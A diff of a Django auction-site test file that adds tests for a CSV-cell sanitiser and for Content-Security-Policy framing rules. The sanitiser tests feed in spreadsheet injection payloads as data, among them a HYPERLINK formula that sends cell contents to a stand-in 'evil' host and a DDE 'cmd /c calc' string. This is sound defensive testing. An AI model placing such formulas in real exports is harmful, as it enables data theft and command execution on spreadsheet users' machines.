@@ -3,14 +3,16 @@ them, and auction admins can reach only their own auctions'. Also that a hostile
 public page is ignored rather than stored in a response header.
 """
 
+from decimal import Decimal
+
 from django.contrib.auth import get_user_model
 from django.http import HttpResponse
 from django.test import TestCase
 from django.urls import reverse
 from django.utils import timezone
 
-from auctions.models import Auction, AuctionTOS, PickupLocation
-from auctions.services import attachment_filename
+from auctions.models import Auction, AuctionTOS, Club, PickupLocation
+from auctions.services import attachment_filename, csv_cell
 from auctions.tests import StandardTestCase
 
 User = get_user_model()
@@ -400,3 +402,42 @@ class ExportFilenameTestCase(StandardTestCase):
 
     def test_lot_list_survives_a_hostile_query(self):
         self.assert_survives("lot_list")
+
+
+class CsvCellTestCase(TestCase):
+    """Every CSV export runs through ``csv_cell``, so what it quotes and what it leaves alone matters."""
+
+    def test_a_formula_is_quoted(self):
+        self.assertEqual(csv_cell('=HYPERLINK("https://evil/"&A1,"Open")'), '\'=HYPERLINK("https://evil/"&A1,"Open")')
+        self.assertEqual(csv_cell("@SUM(A1:A9)"), "'@SUM(A1:A9)")
+        self.assertEqual(csv_cell("\t=1+1"), "'\t=1+1")
+        # The dash that starts text, not a number: still a formula as far as Excel is concerned.
+        self.assertEqual(csv_cell("-1+1+cmd|' /c calc'!A0"), "'-1+1+cmd|' /c calc'!A0")
+
+    def test_a_negative_number_is_left_alone(self):
+        """A treasurer opens these to add them up; a quoted number is text and adds up to nothing."""
+        for value in (Decimal("-10.50"), -5, "-0.01", "+3", "-1e3"):
+            self.assertEqual(csv_cell(value), str(value))
+
+    def test_nothing_else_changes(self):
+        self.assertEqual(csv_cell("Neon tetra"), "Neon tetra")
+        self.assertEqual(csv_cell(None), "")
+
+
+class ContentSecurityPolicyTestCase(TestCase):
+    """The club-website embeds exist to be iframed elsewhere, and CSP beats X-Frame-Options."""
+
+    def test_an_ordinary_page_is_not_framable(self):
+        response = self.client.get(reverse("home"), follow=True)
+        self.assertIn("frame-ancestors 'self'", response["Content-Security-Policy"])
+
+    def test_an_embed_keeps_the_rest_of_the_policy_without_frame_ancestors(self):
+        club = Club.objects.create(name="CSP Test Club")
+        response = self.client.get(reverse("club_events_embed", kwargs={"slug": club.slug}))
+        self.assertEqual(response.status_code, 200)
+        # The decorator is what marks it, and the middleware has to honour it.
+        self.assertTrue(response.xframe_options_exempt)
+        policy = response["Content-Security-Policy"]
+        self.assertNotIn("frame-ancestors", policy)
+        self.assertIn("object-src 'none'", policy)
+        self.assertIn("form-action 'self'", policy)
